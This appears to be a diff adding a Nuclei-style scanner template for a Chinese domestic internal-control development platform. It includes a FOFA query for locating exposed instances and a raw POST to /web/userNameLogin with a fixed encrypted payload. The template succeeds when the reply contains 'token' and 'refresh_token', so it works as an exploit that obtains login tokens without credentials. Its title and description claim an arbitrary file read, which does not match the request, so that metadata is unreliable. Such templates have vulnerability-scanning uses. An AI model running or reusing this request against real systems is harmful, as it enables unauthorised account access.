@@ -1,0 +1,33 @@
+id: qunjie-getToken
+
+info:
+  name: 真内控国产化开发平台 preview 任意文件读取
+  author: god
+  severity: high
+  description: 真内控国产化开发平台 preview 任意文件读取
+  metadata:
+    fofa-query: body="js/npm.echarts.js"
+  tags: qunjie
+
+http:
+  - raw:
+    - |
+      POST /web/userNameLogin HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+      Accept: */*
+      Accept-Encoding: gzip, deflate, br
+      Accept-Language: zh-CN,zh;q=0.9
+      Connection: keep-alive
+      Content-Type: application/json
+      Content-Length: 186
+
+      {"data": "Kuc6J023uv6f02wtN5QxbmFQd4W1kl6EWndTUrJae4/UAD8yAf6Vy/j6X9c1ccQSczndbdd+pI6DR1UKVAsf7FgOwFoNu/blmhzdH2LIArOqj/Wor0Tk90gvrUARcEsPoqfCvrHEnLov4AokD80EdJ0vZT3zl6BbzSdAoYduNxQ="}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - token
+          - refresh_token
+        condition: and
